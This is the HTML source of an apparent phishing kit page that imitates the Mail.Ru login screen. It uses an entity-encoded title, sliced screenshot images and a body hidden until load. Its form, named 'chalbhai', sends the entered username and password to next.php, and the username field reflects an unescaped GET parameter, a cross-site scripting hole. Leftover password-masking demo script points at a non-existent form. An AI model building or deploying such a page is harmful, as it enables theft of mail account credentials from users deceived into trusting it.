<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#97;&#105;&#108;&#46;&#82;&#117;&#58;&#32;&#1087;&#1086;&#1095;&#1090;&#1072;&#44;&#32;&#1087;&#1086;&#1080;&#1089;&#1082;&#32;&#1074;&#32;&#1080;&#1085;&#1090;&#1077;&#1088;&#1085;&#1077;&#1090;&#1077;&#44;&#32;&#1085;&#1086;&#1074;&#1086;&#1089;&#1090;&#1080;&#44;&#32;&#1080;&#1075;&#1088;&#1099;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
	 
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {
    height: 25px;
    width: 275px;
    border: 1px solid #B9BDC1;
    color: #797979;
    border-radius: 3px;
	padding-left: 8px;
	font-size: 13px;
}
 .textbox:focus {
    background-color: #fff;
    outline: 0;
}

 </style>		
<style type="text/css">
.textrbox {
    height: 25px;
    width: 275px;
    border: 0px solid #fff;
    color: #797979;
    border-radius: 3px;
	padding-left: 8px;
	font-size: 13px;
}
 .textrbox:focus {
    background-color: #fff;
    outline: 0;
}
 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:220px; z-index:0"><img src="images/mr1.png" alt="" title="" border=0 width=1365 height=220></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:217px; width:1012px; height:207px; z-index:1"><img src="images/mr2.png" alt="" title="" border=0 width=1012 height=207></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:422px; width:1365px; height:239px; z-index:2"><img src="images/mr3.png" alt="" title="" border=0 width=1365 height=239></div>

<div id="image5" style="position:absolute; overflow:hidden; left:46px; top:321px; width:277px; height:276px; z-index:3"><a href="#"><img src="images/mr5.png" alt="" title="" border=0 width=277 height=276></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:1021px; top:444px; width:305px; height:158px; z-index:4"><a href="#"><img src="images/mr6.png" alt="" title="" border=0 width=305 height=158></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:382px; top:216px; width:482px; height:189px; z-index:5"><a href="#"><img src="images/mr4.png" alt="" title="" border=0 width=482 height=189></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:383px; top:109px; width:606px; height:26px; z-index:6"><a href="#"><img src="images/mr7.png" alt="" title="" border=0 width=606 height=26></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:17px; top:2px; width:621px; height:21px; z-index:7"><a href="#"><img src="images/mr8.png" alt="" title="" border=0 width=621 height=21></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:802px; top:636px; width:554px; height:20px; z-index:8"><a href="#"><img src="images/mr9.png" alt="" title="" border=0 width=554 height=20></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:10px; top:636px; width:283px; height:20px; z-index:9"><a href="#"><img src="images/mr10.png" alt="" title="" border=0 width=283 height=20></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:384px; top:42px; width:421px; height:18px; z-index:10"><a href="#"><img src="images/mr11.png" alt="" title="" border=0 width=421 height=18></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:44px; top:41px; width:305px; height:52px; z-index:11"><a href="#"><img src="images/mr12.png" alt="" title="" border=0 width=305 height=52></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:110px; top:231px; width:178px; height:36px; z-index:12"><a href="#"><img src="images/mr13.png" alt="" title="" border=0 width=178 height=36></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:205px;left:52px;top:141px;z-index:13; font-size:14pt" size="1" tabindex="99">
<input name="pass" id="demo-field" placeholder="&#1087;&#1072;&#1088;&#1086;&#1083;&#1100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:201px;left:52px;top:172px;z-index:14">

<div id="formimage1" style="position:absolute; left:258px; top:171px; z-index:16"><input type="image" name="formimage1" width="84" height="24" src="images/login.png"></div>
<div id="formcheckbox1" style="position:absolute; left:254px; top:201px; z-index:17"><input type="checkbox" name="formcheckbox1"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>